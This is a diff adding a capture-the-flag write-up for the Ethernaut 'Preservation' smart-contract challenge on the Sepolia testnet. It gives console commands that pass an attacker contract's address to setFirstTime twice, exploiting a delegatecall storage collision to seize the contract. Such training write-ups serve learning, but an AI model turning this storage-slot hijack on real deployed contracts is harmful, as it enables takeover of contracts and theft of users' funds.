@@ -187,3 +187,25 @@ Solution:
    ```
 
 ## Problem 16: Preservation
+
+- Preservation contract: [0x85437951906b0333Be9156bf1c415FA1d55AA90e](https://eth-sepolia.blockscout.com/address/0x85437951906b0333Be9156bf1c415FA1d55AA90e)
+
+- SolvePreservation contract: [0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2](https://eth-sepolia.blockscout.com/address/0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2)
+
+Solution:
+
+- Run in dev console
+
+   ```ts
+   let addrNum = _ethers.BigNumber.from("0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2")
+   addrNum.toString()
+   // display: 217536183420285343367994901537296371963644162530
+
+   // Afterward, run (yes, twice)
+   await contract.setFirstTime("217536183420285343367994901537296371963644162530")
+   await contract.setFirstTime("217536183420285343367994901537296371963644162530")
+   ```
+
+- Refer to txHash: [0xbf0291794ccfd65b519f2081c1ef0ee969e2d699d2d9bf41a57dcb871fba3dbd](https://sepolia.etherscan.io/tx/0xbf0291794ccfd65b519f2081c1ef0ee969e2d699d2d9bf41a57dcb871fba3dbd)
+
+In etherscan, when viewing a txHash, looking over **State**, you can see which storage slot a tx has updated.
